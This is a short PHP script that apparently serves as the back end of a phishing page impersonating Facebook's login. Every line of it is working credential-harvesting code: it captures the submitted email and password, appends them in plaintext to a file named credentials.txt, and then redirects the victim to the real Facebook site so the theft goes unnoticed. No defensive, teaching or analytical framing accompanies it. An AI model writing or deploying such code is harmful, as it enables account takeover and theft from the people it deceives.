<?php
 //Extract the credentials received
 $username = $_POST["email"];
 $password = $_POST["pass"];
 
 //Write the credentials to text file
 $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");


$txt = "USERNAME = $username , PASSWORD = $password\n";
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
 
 //Redirect the browser to original login page of Facebook
 header("Location: https://www.facebook.com");
 exit();
?>
